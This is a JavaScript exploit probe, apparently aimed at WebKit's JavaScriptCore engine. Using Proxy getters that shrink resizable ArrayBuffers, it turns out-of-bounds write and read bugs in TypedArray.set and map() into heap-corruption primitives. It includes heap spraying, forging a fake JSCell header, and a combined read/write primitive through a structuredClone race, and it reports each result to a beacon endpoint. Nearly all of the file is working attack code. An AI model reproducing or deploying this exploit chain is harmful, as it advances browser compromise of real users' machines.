/* p74-w2weapon — Weaponize W2 Proxy set() OOB write + W6 map OOB read
 * CONFIRMED BUGS from V73W:
 *   W2: TypedArray.set(proxySrc, offset) — Proxy get handler resizes dst RAB,
 *       set() continues writing past shrunk end. OOB WRITE within maxByteLength.
 *   W6: map/forEach/reduce — callback resizes RAB, iteration continues at
 *       pre-resize length. OOB READ within maxByteLength.
 *
 * This probe: weaponize into heap corruption primitives.
 * Beacon prefix: V74X-
 */
(function(){
"use strict";
var RUN_ID = "v74x" + Math.random().toString(36).slice(2,12);
var PREFIX = "V74X-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,900)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}

/* === Audio beep on load === */
try {
  var ac = new (window.AudioContext || window.webkitAudioContext)();
  var osc = ac.createOscillator();
  var gain = ac.createGain();
  osc.connect(gain);
  gain.connect(ac.destination);
  osc.frequency.value = 880;
  gain.gain.value = 0.3;
  osc.start();
  osc.stop(ac.currentTime + 0.15);
  setTimeout(function(){
    var o2 = ac.createOscillator();
    var g2 = ac.createGain();
    o2.connect(g2); g2.connect(ac.destination);
    o2.frequency.value = 1320;
    g2.gain.value = 0.3;
    o2.start(); o2.stop(ac.currentTime + 0.15);
  }, 200);
} catch(e){}

B("L", "press74-W2 weapon + heap probe");

/* ====== X1: W2 controlled write — write specific byte patterns past end ====== */
function test_X1() {
  var r = {};
  try {
    var dst = new ArrayBuffer(512, { maxByteLength: 512 });
    var dstArr = new Uint8Array(dst);
    // Fill entire backing store with 0xAA
    for (var i = 0; i < 512; i++) dstArr[i] = 0xAA;

    // Source: 256 bytes of controlled data
    var src = new Uint8Array(256);
    for (var j = 0; j < 256; j++) src[j] = 0x41 + (j % 26); // A-Z pattern

    var triggered = false;
    var proxySrc = new Proxy(src, {
      get: function(target, prop) {
        if (prop === '0' && !triggered) {
          triggered = true;
          dst.resize(32); // shrink to 32
        }
        return target[prop];
      }
    });

    // Write at offset 128 — that's past the 32-byte shrunk size
    try {
      dstArr.set(proxySrc, 128);
      r.setOK = true;
    } catch(e) {
      r.setErr = e.message.slice(0,50);
    }

    r.dstSize = dst.byteLength; // 32 after resize
    r.triggered = triggered;

    // Grow back to verify what was written
    dst.resize(512);
    var check = new Uint8Array(dst);

    // Check offset 128-383 for our A-Z pattern
    var matched = 0;
    for (var k = 128; k < 384; k++) {
      if (check[k] === 0x41 + ((k-128) % 26)) matched++;
    }
    r.patternMatch = matched;
    r.OOB_WRITE_CONFIRMED = matched > 200; // wrote our pattern past offset 128

    // Check bytes 32-127 (between shrunk end and write offset)
    var preserved = 0;
    for (var m = 32; m < 128; m++) {
      if (check[m] === 0xAA) preserved++;
    }
    r.preservedAA = preserved;

    // Sample some written bytes
    r.samples = [check[128], check[129], check[200], check[300], check[383]];

  } catch(e) { r.err = e.message.slice(0,80); }
  B("X1-CTRL-WRITE", r);
}

/* ====== X2: W2 write past maxByteLength? ====== */
function test_X2() {
  var r = {};
  try {
    // What if we write past maxByteLength itself?
    var dst = new ArrayBuffer(64, { maxByteLength: 64 });
    var dstArr = new Uint8Array(dst);
    for (var i = 0; i < 64; i++) dstArr[i] = 0xCC;

    var src = new Uint8Array(128); // larger than maxByteLength!
    for (var j = 0; j < 128; j++) src[j] = 0xDD;

    var triggered = false;
    var proxySrc = new Proxy(src, {
      get: function(target, prop) {
        if (prop === '0' && !triggered) {
          triggered = true;
          dst.resize(8); // shrink to 8
        }
        return target[prop];
      }
    });

    // Offset 0, but src is 128 bytes and dst maxByteLength is only 64
    // If set() doesn't re-check: writes 128 bytes starting at 0 → 64 bytes past allocation!
    try {
      dstArr.set(proxySrc, 0);
      r.setOK = true;
    } catch(e) {
      r.setErr = e.name + ":" + e.message.slice(0,50);
    }

    r.dstSize = dst.byteLength;
    r.triggered = triggered;

    // If the write went through, bytes 64-127 would be past the allocation = TRUE HEAP OOB
    // We can't easily check, but we can see if the process survived
    r.survived = true;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("X2-PAST-MAX", r);
}

/* ====== X3: Double-RAB overlap — spray RABs, use W2 to write into adjacent ====== */
function test_X3() {
  var r = {};
  try {
    // Allocate many RABs of the same size — hope they're adjacent
    var rabs = [];
    for (var i = 0; i < 100; i++) {
      var ab = new ArrayBuffer(256, { maxByteLength: 256 });
      var v = new Uint8Array(ab);
      // Each RAB gets unique marker: 0x01 for rab[0], 0x02 for rab[1], etc
      for (var j = 0; j < 256; j++) v[j] = (i + 1) & 0xFF;
      rabs.push(ab);
    }

    // Pick RAB #50 as our target — use W2 to write past its end
    var target = rabs[50];
    var targetArr = new Uint8Array(target);

    var src = new Uint8Array(256);
    for (var k = 0; k < 256; k++) src[k] = 0xFF; // write 0xFF

    var triggered = false;
    var proxySrc = new Proxy(src, {
      get: function(t, prop) {
        if (prop === '0' && !triggered) {
          triggered = true;
          target.resize(8);
        }
        return t[prop];
      }
    });

    try {
      targetArr.set(proxySrc, 0); // write 256 bytes, but buffer shrunk to 8
      r.setOK = true;
    } catch(e) {
      r.setErr = e.message.slice(0,50);
    }

    // Check all RABs for corruption — did our 0xFF bleed into neighbors?
    var corrupted = [];
    for (var m = 0; m < 100; m++) {
      if (m === 50) continue; // skip our target
      var check = new Uint8Array(rabs[m]);
      var ffCount = 0;
      for (var n = 0; n < check.length; n++) {
        if (check[n] === 0xFF) ffCount++;
      }
      if (ffCount > 0) {
        corrupted.push(m + ":" + ffCount);
      }
    }

    r.triggered = triggered;
    r.corruptedCount = corrupted.length;
    r.corrupted = corrupted.slice(0, 10).join("|");
    r.HEAP_CORRUPT = corrupted.length > 0;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("X3-RAB-OVERLAP", r);
}

/* ====== X4: W6 map() — read JSC metadata via OOB read ====== */
function test_X4() {
  var r = {};
  try {
    // Allocate RAB, then allocate interesting JSC objects after it
    // Use map() OOB read to read into the object metadata region

    var rab = new ArrayBuffer(128, { maxByteLength: 128 });
    var ta = new Uint8Array(rab);
    for (var i = 0; i < 128; i++) ta[i] = 0;

    // Spray objects after RAB
    var objs = [];
    for (var j = 0; j < 200; j++) {
      objs.push({ a: 0x41414141, b: j, c: new ArrayBuffer(32) });
    }

    var collected = [];
    var readPastEnd = 0;

    try {
      var mapped = ta.map(function(val, idx) {
        if (idx === 4) rab.resize(8);
        if (idx >= 8) {
          readPastEnd++;
          collected.push(val);
        }
        return val;
      });

      r.mapCalls = collected.length + 8;
      r.readPastEnd = readPastEnd;

      // Analyze collected bytes for pointer-like patterns
      var nonZero = 0;
      var interesting = [];
      for (var k = 0; k < collected.length; k++) {
        if (collected[k] !== 0) {
          nonZero++;
          if (interesting.length < 20) interesting.push(k+8 + ":" + collected[k]);
        }
      }
      r.nonZero = nonZero;
      r.interesting = interesting.join(",");

      // Also grab the mapped result as a DataView for wider reads
      if (mapped.length > 16) {
        r.mappedLen = mapped.length;
        // mapped is a regular Uint8Array, read groups of 4/8 bytes
        var dwords = [];
        for (var m = 8; m < Math.min(mapped.length, 64); m += 4) {
          var dw = mapped[m] | (mapped[m+1]<<8) | (mapped[m+2]<<16) | (mapped[m+3]<<24);
          if (dw !== 0) dwords.push(m + ":0x" + (dw>>>0).toString(16));
        }
        r.dwords = dwords.join(",");
      }
    } catch(e) {
      r.mapErr = e.message.slice(0,50);
    }

    objs = null;
  } catch(e) { r.err = e.message.slice(0,80); }
  B("X4-MAP-LEAK", r);
}

/* ====== X5: Precise W2 — write fake JSCell header adjacent to objects ====== */
function test_X5() {
  var r = {};
  try {
    // If X3 shows heap corruption, we can attempt to:
    // 1. Spray objects of known size
    // 2. Free every other one (create holes)
    // 3. Allocate RAB into a hole
    // 4. Use W2 to write into the adjacent object's JSCell header

    // Step 1: spray same-sized objects
    var spray = [];
    for (var i = 0; i < 500; i++) {
      spray.push({ x: i, y: i*2, z: "str" + i });
    }

    // Step 2: free every other (let GC collect)
    for (var j = 0; j < spray.length; j += 2) {
      spray[j] = null;
    }

    // Step 3: force GC by allocating lots of garbage
    var garbage = [];
    for (var g = 0; g < 50000; g++) garbage.push({g: g});
    garbage = null;

    // Step 4: allocate RAB — might land in a freed slot
    var rab = new ArrayBuffer(64, { maxByteLength: 64 });
    var rabArr = new Uint8Array(rab);
    for (var k = 0; k < 64; k++) rabArr[k] = 0xEE;

    // Step 5: W2 write past the RAB
    var src = new Uint8Array(64);
    // Write a fake JSCell-like header (8 bytes of recognizable pattern)
    src[0] = 0xDE; src[1] = 0xAD; src[2] = 0xBE; src[3] = 0xEF;
    src[4] = 0xCA; src[5] = 0xFE; src[6] = 0xBA; src[7] = 0xBE;
    for (var m = 8; m < 64; m++) src[m] = 0x42;

    var triggered = false;
    var proxySrc = new Proxy(src, {
      get: function(t, prop) {
        if (prop === '0' && !triggered) {
          triggered = true;
          rab.resize(8);
        }
        return t[prop];
      }
    });

    try {
      rabArr.set(proxySrc, 0);
      r.writeOK = true;
    } catch(e) {
      r.writeErr = e.message.slice(0,50);
    }

    // Step 6: check surviving objects for corruption
    var corrupted = 0;
    var crashCheck = true;
    for (var n = 1; n < spray.length; n += 2) {
      if (spray[n] !== null) {
        try {
          var s = spray[n];
          if (s.x !== n || s.y !== n*2) {
            corrupted++;
          }
        } catch(e) {
          corrupted++;
          crashCheck = false;
        }
      }
    }

    r.triggered = triggered;
    r.corrupted = corrupted;
    r.OBJECT_CORRUPT = corrupted > 0;
    r.survived = crashCheck;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("X5-JSCELL", r);
}

/* ====== X6: W2 write WHAT and WHERE control test ====== */
function test_X6() {
  var r = {};
  try {
    // Precise control test: can we control exact offset and content?
    var dst = new ArrayBuffer(1024, { maxByteLength: 1024 });
    var dstArr = new Uint8Array(dst);
    for (var i = 0; i < 1024; i++) dstArr[i] = 0;

    // Test various offsets
    var offsets = [0, 64, 128, 256, 512, 768, 960];
    var results = [];

    for (var o = 0; o < offsets.length; o++) {
      var off = offsets[o];
      dst.resize(1024);
      for (var f = 0; f < 1024; f++) dstArr[f] = 0;

      var src = new Uint8Array(32);
      for (var s = 0; s < 32; s++) src[s] = off & 0xFF; // marker = offset low byte

      var triggered = false;
      var proxySrc = new Proxy(src, {
        get: function(t, prop) {
          if (prop === '0' && !triggered) {
            triggered = true;
            dst.resize(Math.max(8, off - 1)); // shrink to just below write offset
          }
          return t[prop];
        }
      });

      var wrote = false;
      try {
        dstArr.set(proxySrc, off);
        wrote = true;
      } catch(e) {}

      // Grow back and check
      dst.resize(1024);
      var matched = 0;
      for (var c = off; c < off + 32 && c < 1024; c++) {
        if (dstArr[c] === (off & 0xFF)) matched++;
      }

      results.push(off + ":" + (wrote ? "W" : "F") + ":" + matched);
    }

    r.results = results.join("|");

  } catch(e) { r.err = e.message.slice(0,80); }
  B("X6-PRECISION", r);
}

/* ====== X7: Combined R/W — TOCTOU read + W2 write on same allocation ====== */
function test_X7() {
  var r = {};
  try {
    // Allocate RAB, write secret pattern, shrink, TOCTOU-read stale bytes,
    // then W2-write new pattern → verify full R/W control within maxByteLength

    var rab = new ArrayBuffer(256, { maxByteLength: 256 });
    var u8 = new Uint8Array(rab);

    // Write known pattern
    for (var i = 0; i < 256; i++) u8[i] = (i * 7 + 3) & 0xFF;

    // TOCTOU READ: structuredClone with getter shrink
    var readObj = Object.create(null);
    readObj.buf = rab;
    Object.defineProperty(readObj, 'zz', { enumerable: true, get: function() {
      rab.resize(16);
      return 1;
    }});
    var cloned = structuredClone(readObj);
    var readView = new Uint8Array(cloned.buf);

    r.readLen = cloned.buf.byteLength;
    r.readOOB = cloned.buf.byteLength > 16;
    // Verify we read the original pattern at offset 100
    r.readByte100 = readView[100];
    r.expectedByte100 = (100 * 7 + 3) & 0xFF; // 191
    r.readMatch = readView[100] === ((100 * 7 + 3) & 0xFF);

    // W2 WRITE: now write new pattern into the OOB region
    rab.resize(256); // grow back
    var src = new Uint8Array(128);
    for (var j = 0; j < 128; j++) src[j] = 0xBB;

    var triggered = false;
    var proxySrc = new Proxy(src, {
      get: function(t, prop) {
        if (prop === '0' && !triggered) {
          triggered = true;
          rab.resize(16);
        }
        return t[prop];
      }
    });

    try {
      u8.set(proxySrc, 64); // write 128 bytes at offset 64 (past 16-byte boundary)
      r.writeOK = true;
    } catch(e) {
      r.writeErr = e.message.slice(0,50);
    }

    // Verify write: grow back and check
    rab.resize(256);
    r.writeByte100 = u8[100]; // should be 0xBB now
    r.writeMatch = u8[100] === 0xBB;

    // TOCTOU read again to confirm write persisted in OOB region
    var readObj2 = Object.create(null);
    readObj2.buf = rab;
    Object.defineProperty(readObj2, 'zz2', { enumerable: true, get: function() {
      rab.resize(16);
      return 1;
    }});
    var cloned2 = structuredClone(readObj2);
    var readView2 = new Uint8Array(cloned2.buf);

    r.rereadByte100 = readView2[100];
    r.rereadMatch = readView2[100] === 0xBB; // our write persists!

    r.FULL_RW = r.readOOB && r.writeOK && r.rereadMatch;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("X7-COMBINED-RW", r);
}

/* ====== Run ====== */
try {
  test_X1();
  setTimeout(test_X2, 400);
  setTimeout(test_X3, 800);
  setTimeout(test_X4, 1200);
  setTimeout(test_X5, 1600);
  setTimeout(test_X6, 2000);
  setTimeout(test_X7, 2500);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe74-done"); }, 20000);
})();
